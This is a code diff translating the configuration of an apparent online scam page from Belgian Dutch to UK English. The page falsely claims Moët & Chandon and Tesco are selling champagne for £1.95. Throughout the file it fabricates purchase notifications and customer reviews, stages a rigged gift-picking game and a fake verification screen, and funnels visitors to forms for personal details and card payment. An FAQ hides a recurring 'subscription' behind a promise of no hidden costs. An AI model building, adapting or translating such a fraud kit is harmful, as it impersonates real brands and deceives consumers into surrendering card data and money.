@@ -1,162 +1,163 @@
 const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
-const siteKey = "moet-be-2";
+const siteKey = "moet-gb";
 
 (function (exp) {
-  const countryCode = "be";
-  const lang = "nl-BE";
+  const countryCode = "gb";
+  const lang = "en-GB";
   const locale = lang;
 
   const sizes = {
     enabled: false,
-    selectText: "Grootte: ",
+    selectText: "Size: ",
     arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Gefeliciteerd!",
+    name: "Congratulations!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    timer: "De tijd is beperkt, haast u om uw bestelling te plaatsen!",
-    text: "Om zijn 280ste verjaardag te vieren, heeft het toonaangevende champagnemerk <b>Moёt&Chandon</b> samen met de <b>Belgische</b> supermarktketen <b>Carrefour</b> een verkoop gelanceerd van 1.000 flessen Brut Impérial champagne voor slechts <b>1,95 €</b>.",
+    timer: "Time is limited, hurry to place your order!",
+    text: "To celebrate its 280th anniversary, the leading champagne brand <b>Moët&Chandon</b> has partnered with the <b>British</b> supermarket chain <b>Tesco</b> to launch a sale of 1,000 bottles of Brut Impérial champagne for just <b>£1.95</b>.",
   };
 
   const notifications = [
     {
       user: "Bea V***",
-      location: "Brussel, België",
-      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 1,95 €!",
-      timeago: "15 seconden geleden",
+      location: "London, UK",
+      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
+      timeago: "15 seconds ago",
     },
     {
       user: "Tessa B***",
-      location: "Antwerpen, België",
-      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 1,95 €!",
-      timeago: "25 seconden geleden",
+      location: "Manchester, UK",
+      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
+      timeago: "25 seconds ago",
     },
   ];
 
   const reviewsArr = [
     {
       name: "Lucas",
-      time: "1 dag geleden",
-      header: "Dit is geweldig!",
+      time: "1 day ago",
+      header: "This is amazing!",
       product: "26468782",
       image: "./assets/proof1.jpg",
-      review: "Ik hoorde onlangs over deze actie en besloot om het te kopen. Bedankt Moet&Chandon voor deze verkoop.",
+      review: "I recently heard about this offer and decided to buy it. Thank you Moët&Chandon for this sale.",
     },
     {
       name: "Anton",
-      time: "2 dagen geleden",
-      header: "Fantastisch! Ik ben sprakeloos.",
+      time: "2 days ago",
+      header: "Fantastic! I'm speechless.",
       product: "26468789",
       image: "./assets/proof2.jpg",
-      review: "Bedankt. Het pakket werd zeer snel geleverd.",
+      review: "Thank you. The package was delivered very quickly.",
     },
     {
       name: "Josefien",
-      time: "2 dagen geleden",
-      header: "Gewoon geweldig.",
+      time: "2 days ago",
+      header: "He loves it.",
       product: "26468783",
       image: "./assets/proof3.jpg",
-      review: "Mijn man wilde niet dat ik meedeed omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket aankwam, was hij erg blij.",
+      review: "My husband didn't want me to participate because we had never heard of this sale, but when my package arrived, he was very pleased.",
     },
     {
       name: "Nico",
-      time: "4 dagen geleden",
-      header: "Hij houdt ervan.",
+      time: "4 days ago",
+      header: "Simply great",
       image: "./assets/proof4.jpg",
-      review: "Ik wilde deze fles al heel lang en heb er eindelijk een gekregen.",
+      review: "I had wanted this bottle for a long time, and I finally got one.",
     },
     {
       name: "Jan",
-      time: "7 dagen geleden",
-      header: "Wow, ik ben absoluut onder de indruk van dit product!",
+      time: "7 days ago",
+      header: "Wow, I'm absolutely impressed with this product!",
       product: "26468784",
-      review: "Ongelooflijk. Een dure en kwalitatief hoogwaardige fles voor slechts 1,95 €. Bedankt!",
+      // image: "./assets/proof5.jpg",
+      review: "Incredible. An expensive and high-quality bottle for just £1.95. Thank you!",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "BEOORDELINGEN EN RECENSIES",
+    rr: "REVIEWS AND RATINGS",
     percent: "99%",
-    rec: "Recensies van deze actie",
+    rec: "Reviews of this promotion",
   };
 
   const questions = {
-    _of: "Vraag {1} van {2}: ",
+    _of: "Question {1} of {2}: ",
     arr: [
       {
-        q: "Heb je ooit Moet&Chandon Brut Imperial gedronken?",
-        a: ["Ja", "Nee"],
+        q: "Have you ever tried Moët&Chandon Brut Imperial?",
+        a: ["Yes", "No"],
       },
       {
-        q: "Waar heb je deze actie gevonden?",
-        a: ["Op de officiële website", "Facebook-advertenties", "Aanbevolen door een vriend"],
+        q: "Where did you find this promotion?",
+        a: ["On the official website", "Facebook ads", "Recommended by a friend"],
       },
       {
-        q: "Voor welk doel gebruik je Moet&Chandon Brut Imperial?",
-        a: ["Als een cadeau", "Voor persoonlijk gebruik"],
+        q: "What purpose do you use Moët&Chandon Brut Imperial for?",
+        a: ["As a gift", "For personal use"],
       },
     ],
   };
 
   const check = {
-    title: "Uw antwoorden worden gecontroleerd.",
-    secondTitle: "Laden...",
+    title: "Your answers are being verified.",
+    secondTitle: "Loading...",
     arr: [
-      "U heeft vraag 3/3 beantwoord",
-      "Geen eerdere onderzoeken van uw IP.",
-      "Cadeaus worden geladen...",
+      "You have answered question 3/3",
+      "No previous surveys from your IP.",
+      "Gifts are being loaded...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Gefeliciteerd, u heeft met succes bevestigd dat u een echte persoon bent.",
+        header: "Congratulations, you have successfully confirmed that you are a real person.",
         button: "OK",
         text: `
       <center>
-      Vandaag, op {date}, heeft u de kans om uw Moet&Chandon Brut Imperial  te ontvangen.
+      Today, on {date}, you have the chance to receive your Moët&Chandon Brut Imperial.
         <br><br>
-        U hoeft alleen maar het juiste geschenk te kiezen.
+        You just need to choose the correct gift.
         <br><br>
-        U heeft 3 opties, veel geluk!
+        You have 3 options, good luck!
       </center>
     `,
       },
     },
     first: {
       texts: {
-        header: "Oh nee...",
+        header: "Oh no...",
         button: "OK",
         text: `
       <center>
-      Sorry, maar dit geschenk is leeg. U heeft nog 2 pogingen. Veel succes!
+      Sorry, but this gift is empty. You have 2 attempts left. Good luck!
       </center>
     `,
       },
     },
     win: {
       texts: {
-        header: `Gefeliciteerd! U heeft gewonnen!`,
+        header: `Congratulations! You have won!`,
         button: "OK",
         text: `
       <center>
         <p style="color: #b51817">
-        U heeft Moet&Chandon Brut Imperial gewonnen!
+        You have won Moët&Chandon Brut Imperial!
         </p>
         <br>
-        1) Klik hieronder op "OK" om naar de betaalpagina voor de verzending te gaan.
+        1) Click "OK" below to proceed to the payment page for delivery.
          <br><br>
-        2) Vul het formulier in en betaal uw bestelling om Moet&Chandon te ontvangen.
+        2) Fill out the form and pay for your order to receive Moët&Chandon.
         <br><br>
-        3) Het pakket wordt binnen 5 tot 7 dagen geleverd.
+        3) The package will be delivered within 5 to 7 days.
       </center>
     `,
       },
@@ -165,63 +166,63 @@ const siteKey = "moet-be-2";
 
   const faqs = [
     {
-      question: "Hoe lang moet ik op mijn prijs wachten?",
-      answer: "Het duurt meestal 5 tot 7 werkdagen.",
+      question: "How long do I have to wait for my prize?",
+      answer: "It usually takes 5 to 7 working days.",
     },
     {
-      question: "Zijn er verborgen kosten?",
-      answer: "Absoluut niet. Zodra u uw prijs heeft gewonnen en uw gegevens heeft ingevoerd, zorgen wij voor de rest. De verzendkosten zijn voor onze rekening!",
+      question: "Are there any hidden costs?",
+      answer: "Absolutely not. Once you have won your prize and entered your details, we take care of the rest. The delivery costs are on us!",
     },
     {
-      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/een geschenk kiezen?",
-      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerden die kunnen proberen onze prijs te winnen...",
+      question: "I'm a winner, why do I have to answer questions/choose a gift?",
+      answer: "You are not a winner yet, but you are one of the 10 selected who can try to win our prize...",
     },
     {
-      question: "Hoe kan ik de prijs ontvangen als ik win?",
-      answer: "U moet eerst uw afleveradres en contactgegevens invoeren, daarna zal ons systeem u verder leiden. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen wordt aangeboden aan echte mensen.",
+      question: "How can I receive the prize if I win?",
+      answer: "You must first enter your delivery address and contact details, and then our system will guide you further. You must then prove that you are not a robot, as the prize is only offered to real people.",
     },
     {
-      question: "Waarom moet ik 1,95 € voor de prijs betalen?",
-      answer: "1,95 € is geen prijs - het is een abonnement dat bewijst dat u een echt persoon bent. Alle betalingen worden na goedkeuring terugbetaald.",
+      question: "Why do I have to pay £1.95 for the prize?",
+      answer: "£1.95 is not a prize - it is a subscription that proves you are a real person. All payments are refunded upon approval.",
     },
     {
-      question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
-      answer: "Als u uw creditcard niet kunt gebruiken, blokkeert uw bank de transactie: u moet uw bankrekening verifiëren.",
+      question: "I can't use my credit card, the transaction failed?",
+      answer: "If you cannot use your credit card, your bank is blocking the transaction: you must verify your bank account.",
     },
   ];
 
   const cartSteps = {
     personal: {
-      title: "Persoonlijke gegevens",
+      title: "Personal Information",
       fields: {
         name: {
           enabled: true,
-          field: "Voornaam",
+          field: "First Name",
         },
         family: {
           enabled: true,
-          field: "Achternaam",
+          field: "Last Name",
         },
         phone: {
           enabled: true,
-          field: "Telefoonnummer",
+          field: "Phone Number",
         },
         email: {
           enabled: true,
-          field: "E-mail",
+          field: "Email",
         },
       },
     },
     delivery: {
-      title: "Levering",
+      title: "Delivery",
       fields: {
         city: {
           enabled: true,
-          field: "Stad",
+          field: "City",
         },
         address: {
           enabled: true,
-          field: "Leveradres",
+          field: "Delivery Address",
         },
         zip: {
           enabled: true,
@@ -230,48 +231,48 @@ const siteKey = "moet-be-2";
       },
     },
     payment: {
-      title: "Betaalmethoden",
-      creditCard: "Online betaling met creditcard",
+      title: "Payment Methods",
+      creditCard: "Online payment with credit card",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Overzicht van de bestelling",
+      title: "Order Summary",
       oldPrice: "",
-      newPrice: "1,95 €",
-      size: "Grootte",
+      newPrice: "£1.95",
+      size: "Size",
       subTotal: {
-        title: "Bestelwaarde",
-        amount: "1,95 €",
+        title: "Order Value",
+        amount: "£1.95",
       },
       delivery: {
-        title: "Levering",
-        amount: "0,00 €",
+        title: "Delivery",
+        amount: "£0.00",
       },
       total: {
-        title: "Totaal",
-        amount: "1,95 €",
+        title: "Total",
+        amount: "£1.95",
       },
-      checkoutButton: "Betaal uw bestelling",
+      checkoutButton: "Pay for your order",
     },
   };
 
   const products = [
     {
       id: "26468782",
-      name: "Moet&Chandon Brut Imperial",
+      name: "Moët&Chandon Brut Imperial",
       miniImg: "./assets/bottle.png",
 
-      images: ["./assets/slide_1.jpg"
-      ],
+      images: ["./assets/slide_1.jpg", "./assets/slide_2.jpg"],
     },
   ];
 
   const footer = {
-    cr: "© 2024 Moet&Chandon. Alle rechten voorbehouden.",
+    cr: "© 2024 Moët&Chandon. All rights reserved.",
   };
+
 
 
   const pathImgBox = {
